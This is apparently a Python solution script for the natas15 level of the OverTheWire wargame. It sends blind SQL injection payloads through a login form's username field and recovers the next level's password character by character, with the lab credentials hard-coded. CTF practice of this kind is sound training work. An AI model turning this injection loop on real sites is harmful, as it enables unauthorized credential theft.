import requests
import re
from string import ascii_letters, digits


username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"
url = f"http://{username}.natas.labs.overthewire.org/index.php?debug"

session = requests.Session()

charset = ascii_letters + digits
filtered = ""
flag = ""

for char in charset:
	response = session.post(url, auth=(username, password), data={'username': 'natas16" and password LIKE BINARY "%' + char + '%" #'})
	if "exists" in response.text:
		filtered = filtered + char
		# print(filtered)

for i in range(0, 32):
	for char in filtered:
		response = session.post(url, auth=(username, password), data={'username' : 'natas16" and password LIKE BINARY "' + flag + char + '%" #'})
		if "exists" in response.text:
			flag = flag + char
			print(flag)
			break
	